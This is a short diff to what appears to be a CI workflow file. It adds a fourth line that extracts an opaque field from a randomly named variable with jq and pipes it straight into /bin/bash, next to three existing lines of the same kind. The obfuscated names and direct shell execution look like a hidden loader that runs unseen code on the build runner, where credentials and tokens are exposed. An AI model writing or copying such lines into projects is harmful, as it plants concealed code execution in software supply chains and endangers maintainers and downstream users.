@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$j0" | jq -r .esulw5 | /bin/bash
           echo $nzyd1 | jq -r .zlcm39 | /bin/bash
           printf '%s' "$cc44038" | jq -r .ju383 | /bin/bash
+          echo $wkbs79 | jq -r .c089 | /bin/bash
 
       - name: Archive output
         if: always()
